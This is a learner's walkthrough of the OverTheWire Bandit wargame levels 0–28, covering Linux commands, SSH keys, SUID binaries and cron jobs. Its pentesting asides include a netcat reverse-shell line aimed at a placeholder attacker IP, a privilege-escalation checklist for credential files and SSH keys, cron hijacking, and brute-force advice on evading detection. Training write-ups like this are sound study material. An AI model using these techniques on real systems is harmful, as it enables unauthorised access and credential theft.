# Bandit — OverTheWire

## What is Bandit?
Bandit is a wargame from OverTheWire designed to teach Linux fundamentals
through real challenges on an actual Linux server accessed via SSH.

---

## Level 0 → 1
**Goal:** Log into the server via SSH and find the password in a file called `readme`.

**Commands used:**
`ssh bandit0@bandit.labs.overthewire.org -p 2220`
`ls`
`cat readme`

---

## Level 1 → 2
**Goal:** Find the password in a file called `-`.

**Tricky:** `-` is interpreted as an argument, not a filename.

**Solution:**
`cat ./-`  or  `cat < ./-`

---

## Level 2 → 3
**Goal:** Find the password in a file with spaces in the filename.

**Tricky:** Spaces separate arguments in the terminal.

**Solution:**
`cat "spaces in this filename"`

---

## Level 3 → 4
**Goal:** Find a hidden file inside a directory.

**Tricky:** Hidden files start with `.` and don't show with regular `ls`.

**Solution:**
`ls -la`
`cat .hiddenfile`

---

## Level 4 → 5
**Goal:** Find the only human-readable file among many.

**Solution:**
`file ./*`  — shows file type of everything in the directory
`cat ./filename`  — open the one that says ASCII text

---

## Level 5 → 6
**Goal:** Find a file that is human-readable, 1033 bytes, not executable.

**Solution:**
`find . -type f -size 1033c ! -executable`
`cat ./maybehere07/.file2`

---
## The `find` command in depth

The `find` command searches for files using filters. You can combine
as many filters as you need in a single command.

### `-type` filter
Specifies what kind of thing you're looking for:

| Flag | Meaning | Example |
|------|---------|---------|
| `-type f` | files only | `find . -type f` |
| `-type d` | directories only | `find . -type d` |
| `-type l` | symbolic links only | `find . -type l` |

### `-size` filter
Searches by file size. The letter after the number sets the unit:

| Flag | Meaning | Example |
|------|---------|---------|
| `-size 1033c` | exactly 1033 bytes | `find . -size 1033c` |
| `-size +1000c` | bigger than 1000 bytes | `find . -size +1000c` |
| `-size -1000c` | smaller than 1000 bytes | `find . -size -1000c` |

### `!` — the NOT operator
Excludes results that match a condition.
Think of it as "everything EXCEPT this":
```bash
find . ! -executable        # files that are NOT executable
find . ! -type d            # everything that is NOT a directory
find . ! -name "*.txt"      # files that are NOT .txt
```

### Combining filters
Filters stack together, all conditions must be true at the same time:
```bash
# Find files that are:
# - actual files (not directories)
# - exactly 1033 bytes
# - not executable
find . -type f -size 1033c ! -executable
```

---

## Key learnings

| Trick | Solution |
|-------|----------|
| File named `-` | `cat ./-` |
| File with spaces | `cat "filename with spaces"` |
| Hidden files | `ls -la` |
| Find by size/type | `find . -type f -size 1033c ! -executable` |
| File type check | `file ./*` |


-------------------


## Level 6 → 7

**Goal:** Find the password stored somewhere on the server, owned by user bandit7, group bandit6, and exactly 33 bytes in size.

**Tricky:** The `find` command returns a lot of "Permission denied" errors that flood the output, making it hard to see the actual result. You can redirect stderr to clean up the output.

**Solution:**
```bash
find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
cat /path/to/file
```

**Stderr redirection:**
| Command | What it does |
|---|---|
| `2>/dev/null` | hides all errors, shows only results |
| `1>/dev/null` | hides results, shows only errors |
| `2>&1` | merges errors into the normal output |

---

## Level 7 → 8

**Goal:** Find the password in `data.txt` next to the word "millionth".

**Solution:**
```bash
grep "millionth" data.txt
```

---

## Level 8 → 9

**Goal:** Find the only line of text that appears once in `data.txt`.

**Tricky:** `uniq` only detects consecutive duplicates, so you need to sort first to group equal lines together.

**Solution:**
```bash
sort data.txt | uniq -u
```

| Flag | Meaning |
|---|---|
| `-u` | shows only lines that appear exactly once |
| `-d` | shows only duplicated lines |
| `-c` | counts occurrences of each line |

---

## Level 9 → 10

**Goal:** Find the password in `data.txt` among human-readable strings, preceded by several `=` characters.

**Solution:**
```bash
strings data.txt | grep "="
```

---

## Level 10 → 11

**Goal:** The password is stored in `data.txt`, encoded in base64.

**Solution:**
```bash
base64 -d data.txt
```

| Flag | Meaning |
|---|---|
| `-d` | decode (default encodes) |

---

## Level 11 → 12

**Goal:** The password is stored in `data.txt`, where all letters have been rotated 13 positions (ROT13). Case-sensitive.

**Tricky:** `tr` maps characters positionally, so uppercase and lowercase must be handled separately to preserve case.

**Solution:**
```bash
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**How ROT13 works:**
ROT13 splits the alphabet in two halves of 13 and swaps them:
Input:   A B C D E F G H I J K L M | N O P Q R S T U V W X Y Z
Output:  N O P Q R S T U V W X Y Z | A B C D E F G H I J K L M

Applying ROT13 twice returns the original text, since the alphabet has 26 letters.

---

# Bandit — OverTheWire

## Level 12 → 13

**Goal:** The password for the next level is stored in a file called `data.txt` which is a hexdump (hexadecimal representation of binary data) that has been compressed multiple times.

**Understanding the challenge:**
- A hexdump is binary data represented as hexadecimal numbers
- The file has been compressed in multiple layers (gzip, bzip2, compress, etc.)
- You need to reverse both: convert hex to binary AND decompress multiple times

**Step-by-step solution:**

### Step 1: Create a temporary directory (good practice)
```bash
mkdir /tmp/bandit12
cd /tmp/bandit12
```

### Step 2: Copy the data file to your temporary directory
```bash
cp ~/data.txt .
```

### Step 3: Convert hexdump to binary
The file `data.txt` contains hexadecimal text. Use `xxd -r` to reverse it (convert hex → binary):
```bash
xxd -r data.txt data.bin
```

`xxd -r` means "reverse": converts hexadecimal representation back into actual binary data.

### Step 4: Check what type of file it is
```bash
file data.bin
```
Output: `gzip compressed data`

### Step 5: Decompress (loop until you get readable text)
Since there are multiple layers, you need to decompress several times. Use `-c` to output without modifying the original:
```bash
gunzip -c data.bin > data1
file data1
# Output: bzip2 compressed data

bunzip2 -c data1 > data2
file data2
# Output: gzip compressed data

gunzip -c data2 > data3
file data3
# Output: POSIX tar archive

tar -xf data3
ls
# Output: data5.bin

file data5.bin
# Output: bzip2 compressed data

bunzip2 -c data5.bin > data6
file data6
# Output: gzip compressed data

gunzip -c data6 > data7
file data7
# Output: POSIX tar archive

tar -xf data7
ls
# Output: data8.bin

file data8.bin
# Output: gzip compressed data

gunzip -c data8.bin > data9
file data9
# Output: ASCII text
```

### Step 6: Read the password
```bash
cat data9
```

**Key commands learned:**

| Command | What it does |
| --- | --- |
| `xxd -r` | Converts hexadecimal to binary |
| `gunzip -c` | Decompresses gzip without modifying original |
| `bunzip2 -c` | Decompresses bzip2 without modifying original |
| `tar -xf` | Extracts (unpacks) a tar archive |
| `file` | Identifies file type |

**Important note:**
Multiple compression types exist (gzip, bzip2, compress) because they were created at different times and for different purposes. In practice, you don't memorize which is "best" — you just use `file` to identify what type you have, then use the correct decompression command.

---

## Level 13 → 14

**Goal:** The password for the next level is stored in `/etc/bandit_pass/bandit14` and can only be read by user `bandit14`. You're given a private SSH key (`sshkey.private`) to authenticate as `bandit14`.

**The challenge:**
This level teaches you about SSH key-based authentication. Unlike the previous levels where you logged in with a password, you now need to use a private SSH key to authenticate as a different user.

**Why this is tricky:**
When you first try SSH from WITHIN the Bandit server, you get an error about localhost being blocked. This is the gotcha — OverTheWire deliberately blocks SSH connections from localhost to prevent resource abuse. **You must log in from your own machine, not from within the Bandit server.**

**Personal Note:**
I despise this level, whoever created OverTheWire, i'm going to find you and give you a hug.

---

## Step-by-step solution:

### Step 1: Download the SSH key to your local machine

You need to be on YOUR computer, not logged into Bandit.

From your local terminal (Windows Command Prompt, Mac Terminal, Linux Terminal):
```bash
scp -P 2220 bandit13@bandit.labs.overthewire.org:/home/bandit13/sshkey.private ~/
```

This command:
- `scp` = secure copy (like `cp` but over SSH)
- `-P 2220` = port 2220 (OverTheWire's port)
- `bandit13@bandit.labs.overthewire.org:/home/bandit13/sshkey.private` = source file on the server
- `~/` = destination on your machine (home directory)

When prompted, enter bandit13's password.

### Step 2: Use the SSH key to log in as bandit14

From your local machine:
```bash
ssh -i ~/sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
```

This command:
- `ssh` = secure shell (remote login)
- `-i ~/sshkey.private` = use THIS file as your identity/authentication key (instead of a password)
- `bandit14@bandit.labs.overthewire.org` = log in as user `bandit14` on this server
- `-p 2220` = use port 2220

### Step 3: Read the password
Once logged in as bandit14:
```bash
cat /etc/bandit_pass/bandit14
```

---

## Why I got stuck (and how to avoid it):

**The mistake:** Trying to run SSH from WITHIN the Bandit server
```bash
# DON'T DO THIS (from inside bandit13)
ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
# Error: localhost connections blocked
```

**The solution:** Run SSH from your local machine
```bash
# DO THIS (from your computer's terminal)
ssh -i ~/sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
# Works!
```

**Why?** OverTheWire deliberately disables SSH connections from `127.0.0.1` (localhost) to prevent resource exhaustion. This means you can't chain SSH sessions. You must always connect directly from your machine to the server.

**Note:** OverTheWire previously allowed this, but changed the rules to conserve server resources. The level hint doesn't explicitly say this, which is why it's confusing.

---

## Key concepts:

| Concept | Explanation |
| --- | --- |
| **Private SSH key** | A file that proves your identity to a server (like a super-secure password) |
| **`-i` flag in SSH** | "identity file" — tells SSH which key to use for authentication |
| **`scp` command** | Secure copy — transfers files over SSH |
| **localhost blocking** | Bandit disables SSH from `127.0.0.1` to prevent abuse |
| **SSH from your machine** | Always connect directly from your computer, never try to chain SSH sessions |

---

## Summary

- **Bandit 12→13:** Learn about hexdumps, multiple compression layers, and how to decompress systematically
- **Bandit 13→14:** Learn about SSH key-based authentication and the importance of connecting from your local machine, not from the server itself


---


## Level 15 → 16

**Goal:** Submit the password of the current level to port 30000 on localhost.

**Solution:**
`nc localhost 30000`
*(paste password → server returns next password)*

**Key learning:** `nc` connects directly to a host:port and keeps the connection
open waiting for input — no flags needed for a basic connection.

---

## Level 16 → 17

**Goal:** Submit the password to a port on localhost in the range 31000–32000
that speaks SSL/TLS.

**Commands used:**
`nmap localhost -sV -p 31000-32000 -T4`
`openssl s_client -connect localhost:31790 -quiet`

**Tricky:** The server returns an RSA private key, not a password.
Save it locally as `bandit17.key` and use it to connect to the next level.

**Solution:**
1. Scan the port range to find which one has SSL.
2. Connect with `openssl s_client -quiet` (suppresses TLS handshake noise).
3. Paste the password → server returns an RSA private key.
4. Save the key locally, then: `ssh -i bandit17.key bandit17@bandit.labs.overthewire.org -p 2220`

**Key learning:** `-quiet` in `openssl s_client` suppresses the handshake output
so you can actually see the server's response.

---

## Level 17 → 18

**Goal:** Find the one line that changed between `passwords.old` and `passwords.new`.

**Solution:**
`diff passwords.new passwords.old`

The line marked with `<` belongs to the first file (`passwords.new`) — that's the password.

**Key learning:** `diff` marks lines with `<` (first file) and `>` (second file).
The changed line in the newer file is the answer.

---

## Level 18 → 19

**Goal:** Someone modified `.bashrc` to log you out immediately on SSH login.

**Tricky:** An interactive SSH session triggers `.bashrc`, which kicks you out.

**Solution:**
`ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme`

Passing a command directly after `user@host` runs it without starting an
interactive shell — `.bashrc` never fires.

**Key learning:** `ssh user@host command` executes a single command remotely
and exits, bypassing shell config files like `.bashrc`.

---


## Level 19 → 20

**Goal:** Use a SUID binary to read the password of bandit20.

**Concept — SUID (Set User ID):**
Normally a program runs with the permissions of whoever executes it.
With the SUID bit active, the program runs with the permissions of the **file owner**, regardless of who calls it.

You can spot it with `ls -la` — look for an `s` instead of `x` in the owner execute position:

```
-rwsr-xr-x  1 bandit20 bandit19 ...  bandit20-do
 ^^^
 's' here = SUID active, runs as bandit20
```

**Solution:**
```bash
ls -la
./bandit20-do cat /etc/bandit_pass/bandit20
```

The binary executes any command you pass as bandit20. So you pass `cat` on bandit20's password file directly.

**Why it matters in pentesting:**
Finding a SUID binary that runs arbitrary commands is a classic privilege escalation vector.
First recon step on any system:
```bash
find / -perm -4000 2>/dev/null
```
Then check each result on **GTFOBins** (gtfobins.github.io) to see if it's exploitable.

---

## Level 20 → 21

**Goal:** Use a SUID binary that connects to a port and returns the next password if it receives the current one.

**Concepts:**
- `nc` (netcat) — creates network connections, can act as a server or client
- Background processes (`&`) — runs a command without blocking the terminal

**Solution:**
```bash
echo "PASSWORD_BANDIT20" | nc -l -p 4444 &
./suconnect 4444
```

Step by step:
1. `nc -l -p 4444` — listens on port 4444
2. `echo "PASSWORD" |` — pipes the password so nc sends it when someone connects
3. `&` — runs nc in the background so you can keep using the terminal
4. `./suconnect 4444` — connects to port 4444, receives the password, validates it, sends back bandit21's password

**Why it matters in pentesting:**
`nc` is called the "Swiss Army knife of networking". Setting up a listener (`nc -l`) is exactly what you do when catching a **reverse shell**:
```bash
# On your machine (attacker)
nc -l -p 4444

# On victim machine (via exploit)
nc YOUR_IP 4444 -e /bin/bash
```
Once connected, you have an interactive shell on the victim — same concept as this level.

---

## Level 21 → 22

**Goal:** Find a cronjob running as bandit22 that writes its password to a readable temp file.

**Concept — Cron:**
Cron is Linux's task scheduler. It runs commands automatically on a schedule.
System cronjobs are stored in `/etc/cron.d/` — always check this directory on any machine you access.

Crontab format:
```
* * * * *  command
│ │ │ │ └─ day of week (0-7)
│ │ │ └─── month (1-12)
│ │ └───── day of month (1-31)
│ └─────── hour (0-23)
└───────── minute (0-59)
```

**Solution:**
```bash
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/<filename shown in the script>
```

The script runs every minute as bandit22 and copies its password to `/tmp/` with permissions 644 (world-readable). You just read it directly.

**Why it matters in pentesting:**
If a cronjob runs as root and executes a script you can modify, you inject your code and it runs as root. Always check:
- Who owns the script being executed
- What permissions that script has
- Whether you can write to it

---

## Level 22 → 23

**Goal:** A cronjob runs as bandit23 and writes its password to a temp file with a hashed name. Calculate the hash to find the file.

**Concept — Hash functions as predictable filenames:**
The script generates the filename using `md5sum` on a predictable string. If you know the input, you can calculate the output without running the script directly.

**The script:**
```bash
myname=$(whoami)   # returns "bandit23" when run by cron
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

**Solution:**
```bash
# Replicate what the script does, but with bandit23 hardcoded
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
cat /tmp/<hash result>
```

You can't run the script as bandit23, but you can reproduce its logic manually since all inputs are known.

**Why it matters in pentesting:**
Predictable filenames, tokens, or identifiers are a common vulnerability. If you can reverse-engineer how a system generates a value, you can access resources without authorization.

---

## Common Linux directories to check during pentesting

When you get access to a Linux machine, these are the first places to look:

### Scheduled tasks
```
/etc/cron.d/          cronjobs dropped by packages or admins
/etc/cron.daily/      scripts that run daily
/etc/cron.hourly/     scripts that run every hour
/etc/crontab          global system crontab
/var/spool/cron/      per-user crontabs
```
**What to look for:** scripts owned by privileged users that you can modify, or temp files they write that you can read.

### Credentials and config
```
/etc/passwd           list of all users
/etc/shadow           hashed passwords (usually root-only)
/etc/sudoers          who can run what as sudo
~/.ssh/               SSH keys (id_rsa = private key, jackpot if readable)
~/.bash_history       command history, may contain passwords typed in plaintext
/var/www/html/        web app files, often contain DB credentials
```

### SUID binaries
```bash
find / -perm -4000 2>/dev/null
```
Then check each result on gtfobins.github.io

### Writable directories (useful for dropping files/scripts)
```
/tmp/
/var/tmp/
/dev/shm/
```

### Running processes and open ports
```bash
ps aux              # all running processes
ss -tulnp           # open ports and listening services
```

### Interesting files
```bash
find / -name "*.conf" 2>/dev/null    # config files
find / -name "*.log" 2>/dev/null     # log files
find / -name "id_rsa" 2>/dev/null    # SSH private keys
find / -writable -type f 2>/dev/null # files you can write to
```

----

## Level 23 → 24

**Goal:** Get the password by exploiting a cron job that executes scripts from a world-writable directory.

**Tricky:** You can't modify the cron script, but you can drop your own script into the directory it executes. Since there's no interactive terminal, you need to redirect output to a file you can read later.

**Solution:**

`cat /etc/cron.d/cronjob_bandit24` — see what runs and when

`cat /usr/bin/cronjob_bandit24.sh` — read the actual script

`mkdir /tmp/yourfolder`

`nano /tmp/yourfolder/myscript.sh`

Script contents:

```bash
#!/bin/bash
cp /etc/bandit_pass/bandit24 /tmp/yourfolder/pass.txt
chmod 777 /tmp/yourfolder/pass.txt
```

`chmod 777 /tmp/yourfolder/myscript.sh`

`chmod 777 /tmp/yourfolder`

`cp /tmp/yourfolder/myscript.sh /var/spool/bandit24/foo/`

Wait like 30 secs, then: `cat /tmp/yourfolder/pass.txt`

**Key concept — Cron Job Hijacking:** If a cron job executes files from a directory you can write to, you can inject your own code. As blue team: audit permissions of directories used by cron jobs.

---

## Level 24 → 25

**Goal:** Connect to a daemon on port 30002 that requires bandit24's password + a 4-digit PIN (0000–9999).

**Tricky:** That's 10,000 combinations. The server keeps the connection open between attempts, so you can send everything in one shot using a loop.

**Solution:**

```bash
{ for i in $(seq 0 9999); do echo "BANDIT24_PASSWORD $i"; done } | nc localhost 30002
```

**Key concept — Brute Force:** Automating combinations against a network service. In real engagements, add `sleep` between attempts to avoid detection (low and slow attack). As blue team: implement rate limiting and lockout after N failed attempts.

---

## Level 25 → 26

**Goal:** Log in as bandit26 using an SSH key, knowing their shell is not `/bin/bash`.

**Tricky:** bandit26's shell is a script that uses `more` to display a file and then closes the session. Just like Level 13→14, SSH from inside the server is blocked — you must connect from your local machine.

**Solution:**

`cat /etc/passwd | grep bandit26` — check bandit26's shell

From your local machine:

`scp -P 2220 bandit25@bandit.labs.overthewire.org:/home/bandit25/bandit26.sshkey ~/`

Shrink your terminal to minimum height (4-5 lines) — this is critical

`ssh -i ~/bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220`

**Key concept — Restricted Shell:** Not every user has `/bin/bash`. Each user's shell is defined in `/etc/passwd` (last field). A non-standard shell can limit or completely block access.

---

## Level 26 → 27

**Goal:** Escape bandit26's restricted shell and get bandit27's password.

**Tricky:** The shell uses `more` which, with a minimized terminal, enters interactive mode. From `more` you can open `vi`, and from `vi` you can execute bash.

**Solution:**

With terminal minimized, when `more` pauses:

`v` — open vi from more

`:set shell=/bin/bash` — change the shell inside vi

`:shell` — execute bash → successful jailbreak

Now inside as bandit26:

`./bandit27-do cat /etc/bandit_pass/bandit27` — use the SUID binary

**Key concept — Shell Escape + SUID:** Escaping restricted shells via text editors is a classic technique (also works with `vim`, `less`, `man`). SUID allows running a binary with its owner's permissions, not the caller's.

**Personal note:** Seriously, who designed this, WHY? IN WHAT WORLD WOULD YOU NEED THIS?

---

##   Level 27 → 28
Goal: Clone a remote Git repository accessible via SSH and find the password inside its files.
Commands used:
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
ls
cat README
